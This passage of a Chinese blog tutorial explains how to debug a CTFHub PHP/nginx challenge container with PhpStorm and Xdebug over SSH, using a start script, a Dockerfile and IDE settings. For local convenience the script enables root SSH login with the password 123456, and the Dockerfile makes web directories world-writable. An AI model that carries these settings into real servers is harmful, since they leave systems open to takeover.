xdebug</span></span><br></pre></td></tr></table></figure><p>在Dockerfile的同级目录新建一个start.sh文件, 用于完成步骤3,4,5</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#设置 ssh 允许 root 登录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改root密码</span></span><br><span class="line"><span class="built_in">echo</span> root:123456 | chpasswd</span><br><span class="line"><span class="comment">#配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_host = host.docker.internal&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_port = 9003&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.mode = debug&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.max_nesting_level = 1000&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.discover_client_host = true&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="comment">#重启 nginx ssh</span></span><br><span class="line">service nginx restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">#原作者在这加了一个sleep infinity并叮嘱一定加上...... 我们这里千万不要加, 不然进程会一直卡在这导致你访问不了web页面</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br></pre></td></tr></table></figure><p>千万要注意这里题目中使用的是nginx, 不是apache2</p><p>之后继续对dockerfile做出调整, 最终为</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-enable xdebug \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install ssh -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>修改好start.sh和dockerfile之后, 我们手动创建一个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mycodbox .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327234247184.png" alt="image-20240327234247184"></p><p>之后新建一个容器把81和22端口映射出来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328000916452.png" alt="image-20240328000916452"></p><p>看到这里就算成功了</p><p>访问一下也没什么问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001145301.png" alt="image-20240328001145301"></p><p>之后配置phpstorm, 这里原文中就没什么坑了</p><p>直接跳转到原文链接的方法二, </p><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><p>后面至作简单的示例</p><p>选择这个</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001340954.png" alt="image-20240328001340954"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001418960.png" alt="image-20240328001418960"></p><p>一路next</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001550926.png" alt="image-20240328001550926"></p><p>一路next直到看见项目</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001907238.png" alt="image-20240328001907238"></p><p>之后要做</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run&#x2F;Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><strong>配置 CLI Interpreter</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP。设置 CLI Interpreter</p><p>新建一个 CLI Interpreter。选择 From Docker, Vagrant, VM, WSL,Remote….</p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><p>设置 PHP executable 路径。不知道可以进入 container 中使用<code>whereis php</code>进行搜索</p><p>参考原文, 这里不做演示了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002119294.png" alt="image-20240328002119294"></p><p><strong>配置 目录映射</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers。配置目录映射</p><p>注意一定要把 Use path mappings 的勾勾上，才能配置目录映射</p><p>Absolute path on the server 是要手动打上服务器路径的</p><p><strong>配置一个 Run&#x2F;Debug Configuration</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002530718.png" alt="image-20240328002530718"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002948142.png" alt="image-20240328002948142"></p><p>打个断点试试, 成功!!</p><p><strong><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002929316.png" alt="image-20240328002929316"></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot;&gt;&lt;a href=&quot;#PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot; class=&quot;headerlink&quot; title=&quot;PHP storm + Xdebug 远程调</summary>
      
    
    
    
    
  </entry>
  
</feed>
